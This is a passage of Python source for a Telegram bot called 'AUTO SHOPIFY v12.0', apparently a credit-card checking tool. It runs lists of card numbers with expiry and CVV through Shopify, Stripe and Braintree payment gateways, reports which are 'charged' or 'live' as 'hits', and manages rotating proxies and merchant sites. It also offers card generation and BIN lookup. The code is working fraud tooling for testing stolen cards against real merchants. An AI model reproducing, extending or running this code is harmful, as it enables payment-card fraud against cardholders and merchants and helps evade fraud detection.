    content += f"  \U0001f3c6 TOTAL HITS: {len(hits)}\n"
    content += "\u2550" * 50 + "\n"
    
    return content

# ============================================
# UI/UX CONSTANTS & HELPERS
# ============================================

BOT_VERSION = "v12.0"
BOT_NAME = "AUTO SHOPIFY"

# Decorative elements
LINE_TOP = "╔══════════════════════════════╗"
LINE_BOT = "╚══════════════════════════════╝"
LINE_MID = "╠══════════════════════════════╣"
LINE_THIN = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
LINE_DASH = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
LINE_DOT = "┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈"

# Status indicators
ICON_APPROVED = "✅"
ICON_DECLINED = "❌"
ICON_WARNING = "⚠️"
ICON_ERROR = "🔴"
ICON_LIVE = "💚"
ICON_CHARGE = "💰"
ICON_3DS = "🔐"
ICON_CVV = "🔶"
ICON_FUNDS = "💸"
ICON_CLOCK = "⏱"
ICON_CARD = "💳"
ICON_BIN = "🏦"
ICON_GLOBE = "🌍"

def get_bot_header(gateway="shopify"):
    """Generate a styled header for bot messages"""
    if gateway == "stripe_auth":
        return f"""🔓 *{BOT_NAME} {BOT_VERSION}*
⚡ *STRIPE AUTH GATEWAY* ─ FREE
{LINE_DASH}"""
    return f"""🛒 *{BOT_NAME} {BOT_VERSION}*
⚡ *SHOPIFY GATEWAY*
{LINE_DASH}"""

def get_bot_footer():
    """Generate a styled footer"""
    return f"""
{LINE_THIN}
🤖 {BOT_NAME} {BOT_VERSION} │ /help"""

def get_status_emoji(category):
    """Get appropriate emoji set for a card result category"""
    status_map = {
        'CHARGE': ('💰', '✅ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗', '🟢'),
        'LIVE': ('💚', '✅ 𝗟𝗜𝗩𝗘', '🟢'),
        '3DS': ('🔐', '✅ 𝟯𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗', '🟡'),
        'CVV': ('🔶', '⚠️ 𝗖𝗩𝗩 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧', '🟡'),
        'FUNDS': ('💸', '⚠️ 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦', '🟡'),
        'DECLINED': ('❌', '❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗', '🔴'),
        'ERROR': ('🔴', '🔴 𝗘𝗥𝗥𝗢𝗥', '🔴'),
        'UNKNOWN': ('❓', '❓ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡', '⚪'),
    }
    return status_map.get(category, status_map['UNKNOWN'])

# ============================================
# STYLIZED TEXT
# ============================================

def stylize_text(text):
    style_map = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜',
        'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥',
        'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭',
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶',
        'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿',
        's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵'
    }
    return ''.join(style_map.get(c, c) for c in text)

# ============================================
# PROGRESS BAR
# ============================================

def create_progress_bar(current, total, width=20):
    if total == 0:
        return '░' * width + ' 0%'
    percentage = current / total
    filled = int(width * percentage)
    empty = width - filled
    pct = int(percentage * 100)
    return '█' * filled + '░' * empty + f' {pct}%'

# ============================================
# FORMAT RESPONSES
# ============================================

def format_chk_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
    cc = card_data.get('cc', '')
    month = card_data.get('month', '')
    year = card_data.get('year', '')
    cvv = card_data.get('cvv', '')
    
    icon, status_display, dot = get_status_emoji(category)
    
    # Status title based on category
    if category == 'CHARGE':
        title = f"\u26a1 {stylize_text('Card Charged')}"
    elif category == '3DS':
        title = f"\u26a1 {stylize_text('3DS Required')}"
    elif category == 'CVV':
        title = f"\u26a1 {stylize_text('CVV Incorrect')}"
    elif category == 'FUNDS':
        title = f"\u26a1 {stylize_text('Insufficient Funds')}"
    elif category == 'DECLINED':
        title = f"\u26a1 {stylize_text('Card Declined')}"
    else:
        title = f"\u26a1 {stylize_text('Unknown Response')}"
    
    message = f"{title}\n\n"
    message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Shopify Payments')}\n"
    message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
    message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
    
    if bin_info:
        message += f"\n\u26a1 {stylize_text('BIN Info')}:\n"
        brand = bin_info.get('brand', bin_info.get('info', 'Unknown'))
        card_type = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', '')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country', 'Unknown')
        message += f"\u26a1 {stylize_text('Brand')}: {stylize_text(str(brand).upper())}\n"
        message += f"\u26a1 {stylize_text('Type')}: {stylize_text(str(card_type).upper())}\n"
        if level:
            message += f"\u26a1 {stylize_text('Level')}: {stylize_text(str(level).upper())}\n"
        message += f"\u26a1 {stylize_text('Bank')}: {stylize_text(str(bank).upper())}\n"
        message += f"\u26a1 {stylize_text('Country')}: {country}\n"
    
    message += f"\n\u26a1 {stylize_text('Time')}: {stylize_text(str(elapsed) + 's')}"
    message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
    return message

def format_stripe_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
    cc = card_data.get('cc', '')
    month = card_data.get('month', '')
    year = card_data.get('year', '')
    cvv = card_data.get('cvv', '')
    
    icon, status_display, dot = get_status_emoji(category)
    
    # Status title based on category
    if category == 'LIVE':
        title = f"\u26a1 {stylize_text('Card Live')}"
    elif category == '3DS':
        title = f"\u26a1 {stylize_text('3DS Required')}"
    elif category == 'CVV':
        title = f"\u26a1 {stylize_text('CVV Incorrect')}"
    elif category == 'DECLINED':
        title = f"\u26a1 {stylize_text('Card Declined')}"
    else:
        title = f"\u26a1 {stylize_text('Unknown Response')}"
    
    message = f"{title}\n\n"
    message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Stripe Auth')}\n"
    message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
    message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
    
    if bin_info:
        message += f"\n\u26a1 {stylize_text('BIN Info')}:\n"
        brand = bin_info.get('brand', bin_info.get('info', 'Unknown'))
        card_type = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', '')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country', 'Unknown')
        message += f"\u26a1 {stylize_text('Brand')}: {stylize_text(str(brand).upper())}\n"
        message += f"\u26a1 {stylize_text('Type')}: {stylize_text(str(card_type).upper())}\n"
        if level:
            message += f"\u26a1 {stylize_text('Level')}: {stylize_text(str(level).upper())}\n"
        message += f"\u26a1 {stylize_text('Bank')}: {stylize_text(str(bank).upper())}\n"
        message += f"\u26a1 {stylize_text('Country')}: {country}\n"
    
    message += f"\n\u26a1 {stylize_text('Time')}: {stylize_text(str(elapsed) + 's')}"
    message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
    return message

def format_sc_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
    cc = card_data.get('cc', '')
    month = card_data.get('month', '')
    year = card_data.get('year', '')
    cvv = card_data.get('cvv', '')
    
    if category == 'CHARGE':
        title = f"\u26a1 {stylize_text('Card Charged')}"
    elif category == '3DS':
        title = f"\u26a1 {stylize_text('3DS Required')}"
    elif category == 'CVV':
        title = f"\u26a1 {stylize_text('CVV Incorrect')}"
    elif category == 'FUNDS':
        title = f"\u26a1 {stylize_text('Insufficient Funds')}"
    elif category == 'DECLINED':
        title = f"\u26a1 {stylize_text('Card Declined')}"
    else:
        title = f"\u26a1 {stylize_text('Unknown Response')}"
    
    message = f"{title}\n\n"
    message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Stripe Charge $10')}\n"
    message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
    message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
    
    if bin_info:
        message += f"\n\u26a1 {stylize_text('BIN Info')}:\n"
        brand = bin_info.get('brand', bin_info.get('info', 'Unknown'))
        card_type = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', '')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country', 'Unknown')
        message += f"\u26a1 {stylize_text('Brand')}: {stylize_text(str(brand).upper())}\n"
        message += f"\u26a1 {stylize_text('Type')}: {stylize_text(str(card_type).upper())}\n"
        if level:
            message += f"\u26a1 {stylize_text('Level')}: {stylize_text(str(level).upper())}\n"
        message += f"\u26a1 {stylize_text('Bank')}: {stylize_text(str(bank).upper())}\n"
        message += f"\u26a1 {stylize_text('Country')}: {country}\n"
    
    message += f"\n\u26a1 {stylize_text('Time')}: {stylize_text(str(elapsed) + 's')}"
    message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
    return message

def format_b3_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
    cc = card_data.get('cc', '')
    month = card_data.get('month', '')
    year = card_data.get('year', '')
    cvv = card_data.get('cvv', '')
    
    if category == 'LIVE':
        title = f"\u26a1 {stylize_text('Card Live')}"
    elif category == '3DS':
        title = f"\u26a1 {stylize_text('3DS Required')}"
    elif category == 'CVV':
        title = f"\u26a1 {stylize_text('CVV Match')}"
    elif category == 'DECLINED':
        title = f"\u26a1 {stylize_text('Card Declined')}"
    else:
        title = f"\u26a1 {stylize_text('Unknown Response')}"
    
    message = f"{title}\n\n"
    message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Braintree Auth $0')}\n"
    message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
    message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
    
    if bin_info:
        message += f"\n\u26a1 {stylize_text('BIN Info')}:\n"
        brand = bin_info.get('brand', bin_info.get('info', 'Unknown'))
        card_type = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', '')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country', 'Unknown')
        message += f"\u26a1 {stylize_text('Brand')}: {stylize_text(str(brand).upper())}\n"
        message += f"\u26a1 {stylize_text('Type')}: {stylize_text(str(card_type).upper())}\n"
        if level:
            message += f"\u26a1 {stylize_text('Level')}: {stylize_text(str(level).upper())}\n"
        message += f"\u26a1 {stylize_text('Bank')}: {stylize_text(str(bank).upper())}\n"
        message += f"\u26a1 {stylize_text('Country')}: {country}\n"
    
    message += f"\n\u26a1 {stylize_text('Time')}: {stylize_text(str(elapsed) + 's')}"
    message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
    return message

# ============================================
# BATCH SENDER
# ============================================

def send_batch_approved(chat_id, gateway="shopify"):
    global pending_approved, last_batch_time
    
    with batch_lock:
        if not pending_approved:
            return
        
        batch_messages = pending_approved.copy()
        pending_approved = []
    
    if batch_messages:
        if gateway == "stripe_auth":
            gateway_name = "🔓 STRIPE AUTH"
        else:
            gateway_name = "✅ SHOPIFY"
            
        combined = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        combined += f"{gateway_name} *APPROVED CARDS*\n"
        combined += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        combined += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n".join(batch_messages)
        
        try:
            bot.send_message(chat_id, combined, parse_mode='Markdown')
            last_batch_time = time.time()
        except:
            pass

def add_approved_to_batch(chat_id, message, gateway="shopify"):
    global pending_approved, last_batch_time
    
    with batch_lock:
        pending_approved.append(message)
        
        if len(pending_approved) >= BATCH_SIZE:
            send_batch_approved(chat_id, gateway)
        else:
            def delayed_send():
                time.sleep(BATCH_DELAY)
                send_batch_approved(chat_id, gateway)
            
            if len(pending_approved) == 1:
                threading.Thread(target=delayed_send, daemon=True).start()

# ============================================
# MAIN KEYBOARD
# ============================================

def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=3)
    # ── Row 1: Gateway Checks ──
    keyboard.row(
        InlineKeyboardButton("🛒 CHK", callback_data="check"),
        InlineKeyboardButton("📦 MASS", callback_data="mass"),
        InlineKeyboardButton("🏆 HITS", callback_data="hits")
    )
    # ── Row 2: Stripe Auth ──
    keyboard.row(
        InlineKeyboardButton("🔓 AU CHK", callback_data="stripe_check"),
        InlineKeyboardButton("🔓 AU MASS", callback_data="stripe_mass"),
        InlineKeyboardButton("🔓 AU HITS", callback_data="stripe_hits")
    )
    # ── Row 3: Stripe Charge $10 ──
    keyboard.row(
        InlineKeyboardButton("💳 SC CHK", callback_data="sc_check"),
        InlineKeyboardButton("💳 SC MASS", callback_data="sc_mass"),
        InlineKeyboardButton("💳 SC HITS", callback_data="sc_hits")
    )
    # ── Row 4: Braintree Auth $0 ──
    keyboard.row(
        InlineKeyboardButton("🔐 B3 CHK", callback_data="b3_check"),
        InlineKeyboardButton("🔐 B3 MASS", callback_data="b3_mass"),
        InlineKeyboardButton("🔐 B3 HITS", callback_data="b3_hits")
    )
    # ── Row 5: Infrastructure ──
    keyboard.row(
        InlineKeyboardButton("🌐 Sites", callback_data="sites"),
        InlineKeyboardButton("📡 Proxies", callback_data="proxies"),
        InlineKeyboardButton("⚡ PX Check", callback_data="px")
    )
    # ── Row 4: Settings ──
    keyboard.row(
        InlineKeyboardButton("🎮 Mode", callback_data="mode_menu"),
        InlineKeyboardButton("⚙️ Workers", callback_data="setworkers_menu"),
        InlineKeyboardButton("📊 Stats", callback_data="stats")
    )
    # ── Row 5: Utilities ──
    keyboard.row(
        InlineKeyboardButton("🏦 BIN Info", callback_data="bin_lookup"),
        InlineKeyboardButton("🎲 Generate", callback_data="gen_cards"),
        InlineKeyboardButton("📎 Export", callback_data="export")
    )
    # ── Row 6: Tools ──
    keyboard.row(
        InlineKeyboardButton("🔒 Permanent", callback_data="permanent_sites"),
        InlineKeyboardButton("🔧 Fix Sites", callback_data="fix_sites")
    )
    # ── Row 7: Control ──
    keyboard.row(
        InlineKeyboardButton("🗑️ Clear Cards", callback_data="clear_menu"),
        InlineKeyboardButton("🛑 STOP", callback_data="stop_mass"),
        InlineKeyboardButton("❓ Help", callback_data="help")
    )
    return keyboard

def safe_send_message(chat_id, text, parse_mode=None, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except:
        return bot.send_message(chat_id, text, reply_markup=reply_markup)

# ============================================
# AUTO FILE DETECTION
# ============================================

@bot.message_handler(content_types=['document'])
def handle_document(message):
    global pending_file_cards
    processing_msg = bot.reply_to(message, "⏳ Analyzing file...")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        for encoding in ['utf-8', 'latin-1', 'cp1252']:
            try:
                file_content = downloaded_file.decode(encoding)
                break
            except:
                continue
        else:
            bot.edit_message_text("❌ Could not read file", chat_id=message.chat.id, message_id=processing_msg.message_id)
            return
        
        lines = file_content.split('\n')
        cards_list = []
        sites_list = []
        proxies_list = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            line_type = detect_line_type(line)
            if line_type == 'card':
                parts = line.split('|')
                if len(parts) >= 4:
                    cards_list.append(line)
            elif line_type == 'site':
                url = extract_url_from_text(line)
                if not url:
                    url = normalize_url(line)
                if url:
                    sites_list.append(url)
            elif line_type == 'proxy':
                proxies_list.append(line)
        
        sites_added = 0
        proxies_added = 0
        for url in sites_list:
            if add_site(url):
                sites_added += 1
        for proxy in proxies_list:
            if add_proxy(proxy):
                proxies_added += 1
        
        if not cards_list:
            response = f"""
{LINE_DASH}
📂 *FILE PROCESSED*
{LINE_DASH}

💳 *Cards found:* 0"""
            if sites_added > 0 or proxies_added > 0:
                response += f"\n🌐 *Sites Added:* +{sites_added}\n📡 *Proxies Added:* +{proxies_added}"
            else:
                response += "\n\n❌ No cards, sites or proxies found in file"
            try:
                bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
            except:
                bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
            return
        
        chat_id = str(message.chat.id)
        pending_file_cards[chat_id] = {
            'cards': cards_list,
            'sites_added': sites_added,
            'proxies_added': proxies_added,
            'timestamp': time.time()
        }
        
        response = f"""
{LINE_DASH}
📂 *FILE ANALYZED*
{LINE_DASH}

💳 *Cards found:* {len(cards_list)}"""
        if sites_added > 0 or proxies_added > 0:
            response += f"\n🌐 *Sites Added:* +{sites_added}\n📡 *Proxies Added:* +{proxies_added}"
        
        response += f"\n\n{LINE_THIN}\n🔽 *Select gateway to load cards:*"
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("🛒 Shopify", callback_data="file_gw_shopify"),
            InlineKeyboardButton("🔓 Stripe Auth (FREE)", callback_data="file_gw_stripe_auth"),
            InlineKeyboardButton("💳 Stripe Charge $10", callback_data="file_gw_stripe_charge"),
            InlineKeyboardButton("🔐 Braintree Auth $0", callback_data="file_gw_braintree_auth"),
            InlineKeyboardButton("📦 ALL GATEWAYS", callback_data="file_gw_all")
        )
        
        try:
            bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id,
                                parse_mode='Markdown', reply_markup=markup)
        except:
            bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id,
                                reply_markup=markup)
    
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)[:100]}", chat_id=message.chat.id, message_id=processing_msg.message_id)

def process_file_cards_to_gateway(chat_id_str, gateway):
    global pending_file_cards
    data = pending_file_cards.get(chat_id_str)
    if not data:
        return 0, 0, 0
    
    cards_list = data.get('cards', [])
    added = 0
    dup = 0
    
    for card_line in cards_list:
        parts = card_line.split('|')
        if len(parts) < 4:
            continue
        cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        
        if gateway == "shopify":
            if add_card(cc, month, year, cvv):
                added += 1
            else:
                dup += 1
        elif gateway == "stripe_auth":
            if add_stripe_card(cc, month, year, cvv):
                added += 1
            else:
                dup += 1
        elif gateway == "stripe_charge":
            if add_sc_card(cc, month, year, cvv):
                added += 1
            else:
                dup += 1
        elif gateway == "braintree_auth":
            if add_b3_card(cc, month, year, cvv):
                added += 1
            else:
                dup += 1
    
    return len(cards_list), added, dup

def detect_line_type(line):
    line = line.strip()
    if not line:
        return 'empty'
    for sep in ['|', '/', ';', ',']:
        if sep in line:
            parts = line.split(sep)
            if len(parts) >= 4:
                cc = re.sub(r'[^\d]', '', parts[0])
                if len(cc) >= 13 and len(cc) <= 19 and cc.isdigit():
                    if validate_luhn(cc):
                        return 'card'
    url_patterns = [
        r'https?://',
        r'\.com\b', r'\.org\b', r'\.net\b', r'\.shop\b', r'\.store\b',
        r'\.io\b', r'\.co\b', r'\.uk\b', r'\.de\b', r'\.fr\b', r'\.es\b',
        r'\.it\b', r'\.ca\b', r'\.au\b', r'\.br\b', r'\.mx\b', r'\.ar\b',
        r'\.cl\b', r'\.co\.uk\b', r'\.com\.au\b', r'\.com\.br\b',
        r'\.xyz\b', r'\.online\b', r'\.site\b', r'\.info\b', r'\.biz\b',
        r'\.us\b', r'\.eu\b', r'\.app\b', r'\.dev\b', r'\.me\b',
        r'\.in\b', r'\.jp\b', r'\.ru\b', r'\.nl\b', r'\.se\b', r'\.no\b',
        r'\.ie\b', r'\.pt\b', r'\.pl\b', r'\.cz\b', r'\.at\b', r'\.ch\b',
        r'myshopify\.com'
    ]
    for pattern in url_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            return 'site'
    if ':' in line and '/' not in line:
        parts = line.split(':')
        if len(parts) in [2, 4]:
            ip = parts[0].strip()
            port_str = parts[1].strip()
            ip_match = re.match(r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$', ip)
            if ip_match:
                octets_valid = all(int(o) <= 255 for o in ip_match.groups())
                try:
                    port = int(port_str)
                    port_valid = 1 <= port <= 65535
                except ValueError:
                    port_valid = False
                if octets_valid and port_valid:
                    return 'proxy'
    return 'invalid'

# ============================================
# NEW UTILITY COMMANDS
# ============================================

@bot.message_handler(commands=['addproxy'])
def addproxy_command(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /addproxy IP:PORT or /addproxy IP:PORT:USER:PASS")
        return
    proxy_str = args[1].strip()
    valid, reason = validate_proxy_format(proxy_str)
    if not valid:
        bot.reply_to(message, f"❌ Invalid proxy: {reason}")
        return
    if add_proxy(proxy_str):
        latency_info = ""
        if check_proxy_socket(proxy_str):
            lat = proxy_latency.get(proxy_str, 0)
            latency_info = f"\n⏱ Latency: {lat}ms"
        bot.reply_to(message, f"✅ Proxy added: `{proxy_str}`{latency_info}", parse_mode='Markdown')
    else:
        bot.reply_to(message, "⚠️ Proxy already exists")

@bot.message_handler(commands=['testsite'])
def testsite_command(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /testsite URL")
        return
    url = args[1].strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    processing_msg = bot.reply_to(message, f"🔍 Testing site: {url}...")
    valid, result = validate_site_url(url)
    if not valid:
        bot.edit_message_text(f"❌ Invalid URL: {result}", chat_id=message.chat.id, message_id=processing_msg.message_id)
        return
    alive, status_code, response_time = check_site_alive(url, timeout=8)
    response = f"🌐 *Site Test: {url}*\n{LINE_DASH}\n"
    response += f"📋 URL Valid: ✅\n"
    if alive:
        response += f"🟢 Status: ONLINE (HTTP {status_code})\n"
        response += f"⏱ Response: {response_time:.2f}s\n"
        is_perm = sqlite_backup.is_permanent_site(url)
        if is_perm:
            response += f"🔒 Permanent: YES\n"
        if url in site_stats:
            total, success = site_stats[url]
            rate = (success / total * 100) if total > 0 else 0
            response += f"📊 Stats: {success}/{total} ({rate:.0f}% success)\n"
    else:
        response += f"🔴 Status: OFFLINE\n"
        response += f"⚠️ Site is not reachable\n"
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

@bot.message_handler(commands=['cardinfo'])
def cardinfo_command(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /cardinfo cc|mm|yy|cvv")
        return
    card = parse_card_line(args[1])
    if not card:
        bot.reply_to(message, "❌ Invalid card format or failed Luhn check")
        return
    cc = card['cc']
    month = card['month']
    year = card['year']
    cvv = card['cvv']
    expired = is_card_expired(month, year)
    bin_info = bin_lookup(cc[:6])
    response = f"💳 *Card Validation*\n{LINE_DASH}\n"
    response += f"⚡ {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
    response += f"✅ Luhn: VALID\n"
    response += f"{'❌ EXPIRED' if expired else '✅ NOT EXPIRED'}\n"
    response += f"📏 Length: {len(cc)} digits\n"
    response += f"🔢 CVV: {'4 digits (AMEX)' if len(cvv) == 4 else '3 digits'}\n"
    brand = "UNKNOWN"
    if cc.startswith('4'):
        brand = "VISA"
    elif cc.startswith(('51','52','53','54','55')):
        brand = "MASTERCARD"
    elif cc.startswith(('34','37')):
        brand = "AMEX"
    elif cc.startswith('6011') or cc.startswith('65'):
        brand = "DISCOVER"
    elif cc.startswith(('300','301','302','303','304','305','36','38')):
        brand = "DINERS"
    elif cc.startswith(('2131','1800','35')):
        brand = "JCB"
    response += f"🏷 Brand: {brand}\n"
    if bin_info:
        response += f"\n🏦 *BIN Info*:\n"
        response += f"  Type: {bin_info.get('type', 'N/A')}\n"
        response += f"  Level: {bin_info.get('level', 'N/A')}\n"
        response += f"  Bank: {bin_info.get('bank', 'N/A')}\n"
        response += f"  Country: {bin_info.get('country', 'N/A')}\n"
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
    except:
        bot.reply_to(message, response.replace('*', ''))

@bot.message_handler(commands=['dedup'])
def dedup_command(message):
    processing_msg = bot.reply_to(message, "🔍 Scanning for duplicates across all gateways...")
    all_queues = {
        'Shopify': (get_all_cards, save_cards),
        'Stripe Auth': (get_all_stripe_cards, save_stripe_cards),
        'Stripe Charge': (get_all_sc_cards, save_sc_cards),
        'Braintree Auth': (get_all_b3_cards, save_b3_cards),
    }
    total_removed = 0
    details = []
    for name, (loader, saver) in all_queues.items():
        cards = loader()
        original = len(cards)
        unique = list(dict.fromkeys(cards))
        dupes = original - len(unique)
        if dupes > 0:
            saver(unique)
            total_removed += dupes
            details.append(f"  {name}: {dupes} duplicados removidos")
    cross_dupes = 0
    all_seen = set()
    for name, (loader, saver) in all_queues.items():
        cards = loader()
        clean = []
        for c in cards:
            if c not in all_seen:
                all_seen.add(c)
                clean.append(c)
            else:
                cross_dupes += 1
        if len(clean) < len(cards):
            saver(clean)
    total_removed += cross_dupes
    response = f"🧹 *Deduplication Complete*\n{LINE_DASH}\n"
    if details:
        response += "\n".join(details) + "\n"
    if cross_dupes > 0:
        response += f"  Cross-gateway: {cross_dupes} duplicados removidos\n"
    if total_removed == 0:
        response += "✅ No duplicates found!\n"
    else:
        response += f"\n🗑 Total removed: {total_removed}\n"
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

@bot.message_handler(commands=['cleanexp'])
def cleanexp_command(message):
    processing_msg = bot.reply_to(message, "🔍 Scanning for expired cards...")
    all_queues = {
        'Shopify': (get_all_cards, save_cards),
        'Stripe Auth': (get_all_stripe_cards, save_stripe_cards),
        'Stripe Charge': (get_all_sc_cards, save_sc_cards),
        'Braintree Auth': (get_all_b3_cards, save_b3_cards),
    }
    total_removed = 0
    details = []
    for name, (loader, saver) in all_queues.items():
        cards = loader()
        valid_cards = []
        expired_count = 0
        for card_str in cards:
            parsed = parse_card_line(card_str)
            if parsed and is_card_expired(parsed['month'], parsed['year']):
                expired_count += 1
            else:
                valid_cards.append(card_str)
        if expired_count > 0:
            saver(valid_cards)
            total_removed += expired_count
            details.append(f"  {name}: {expired_count} expired removed")
    response = f"🧹 *Expired Cards Cleanup*\n{LINE_DASH}\n"
    if details:
        response += "\n".join(details) + "\n"
    if total_removed == 0:
        response += "✅ No expired cards found!\n"
    else:
        response += f"\n🗑 Total expired removed: {total_removed}\n"
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

@bot.message_handler(commands=['proxyinfo'])
def proxyinfo_command(message):
    proxies = load_proxies()
    if not proxies:
        bot.reply_to(message, "❌ No proxies loaded")
        return
    processing_msg = bot.reply_to(message, f"📡 Analyzing {len(proxies)} proxies...")
    response = f"📡 *Proxy Dashboard*\n{LINE_DASH}\n"
    response += f"📊 Total: {len(proxies)}\n"
    valid_count = 0
    invalid_count = 0
    auth_count = 0
    for p in proxies:
        valid, _ = validate_proxy_format(p)
        if valid:
            valid_count += 1
            parts = p.split(':')
            if len(parts) >= 4:
                auth_count += 1
        else:
            invalid_count += 1
    response += f"✅ Valid format: {valid_count}\n"
    response += f"❌ Invalid format: {invalid_count}\n"
    response += f"🔑 With auth: {auth_count}\n"
    response += f"🔓 No auth: {valid_count - auth_count}\n"
    if proxy_latency:
        latencies = list(proxy_latency.values())
        avg_lat = sum(latencies) / len(latencies)
        min_lat = min(latencies)
        max_lat = max(latencies)
        response += f"\n⏱ *Latency Stats*:\n"
        response += f"  Avg: {avg_lat:.0f}ms\n"
        response += f"  Min: {min_lat}ms\n"
        response += f"  Max: {max_lat}ms\n"
    if failed_proxies:
        response += f"\n⚠️ Failed proxies in cooldown: {len(failed_proxies)}\n"
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
